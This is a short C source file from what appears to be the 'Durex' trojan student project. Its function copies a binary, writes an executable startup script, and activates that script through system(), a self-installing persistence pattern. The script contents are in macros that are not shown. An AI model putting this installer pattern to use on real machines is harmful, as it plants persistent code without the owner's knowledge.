/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   install.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/15 02:21:05 by root              #+#    #+#             */
/*   Updated: 2018/07/15 02:50:10 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* system */
#include <stdlib.h>
/* mmap */
#include <sys/mman.h>

#include "main.h"

void				install_binary(int durex)
{
	int				fd;
	void			*data;
	int				size;

	if ((fd = open("./Durex", O_RDONLY)) == -1)
		return ;
	if ((size = lseek(fd, 1, SEEK_END)) == -1) {
		close(fd);
		return ;
	}
	data = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (data == MAP_FAILED) {
		close(fd);
		return ;
	}
	close(fd);
	write(durex, data, size);
	munmap(data, size);
	if ((fd = open(DUREX_SCRIPT_FILE, O_CREAT | O_EXCL | O_WRONLY, 0755)) == -1)
		return ;
	write(fd, DUREX_SCRIPT, sizeof(DUREX_SCRIPT));
	system(DUREX_ACTIVATE_SCRIPT);
	close(fd);
}
